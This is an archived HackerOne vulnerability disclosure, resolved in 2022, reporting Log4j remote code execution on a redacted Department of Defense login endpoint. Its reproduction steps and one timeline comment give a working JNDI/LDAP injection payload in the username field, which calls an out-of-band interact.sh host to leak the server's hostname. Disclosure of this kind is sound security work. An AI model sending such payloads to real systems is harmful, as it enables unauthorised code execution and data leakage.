---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
  - vuln/code-injection
  - impact/rce
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2022-09-06
submitted: 2022-07-08T13:59:08.921Z
bounty_usd: null
votes: 1
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "hachimanxienim"
source: "https://hackerone.com/reports/1631364"
title: "██████_log4j - https://██████"
---
# ██████_log4j - https://██████

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 1 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-09-06

- Report: [https://hackerone.com/reports/1631364](https://hackerone.com/reports/1631364)
- CWE: Code Injection
- Submitted: 2022-07-08T13:59:08.921Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi security team, i found a log4j vulnerability in your aplication

## Impact

Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Send POST request to this endpoint --->  https://██████/mifs/j_spring_security_check


the post request: 

j_username=${jndi:ldap://${hostName}.youinteractsserver}&j_password=password&logincontext=employee

## Suggested Mitigation/Remediation Actions

## Timeline

- **Report Filed**
- **2022-07-08** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **Report New**
- **2022-07-08** @hachimanxienim: payload ---->   j_username=${jndi:ldap://${hostName}.█████.interact.sh}&j_password=password&logincontext=employee
URL---->   https://████/mifs/j_spring_security_check
Try to send the same payload and just modify the interact adress. if you need help you can ask ok?
- **2022-07-08** @hachimanxienim: The host in your basic function will be return 403(forbidden) but not to the full path, in the full path the host will accept your request, so you can just send the payload to the vulnerable parameter.
- **2022-07-08** @hachimanxienim: sorry for the late reply
- **Report Needs More Info**
- **Report New**
- **2022-07-08** @hachimanxienim: Again if you need any more info just ask
- **Report Vulnerability Types Updated**
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
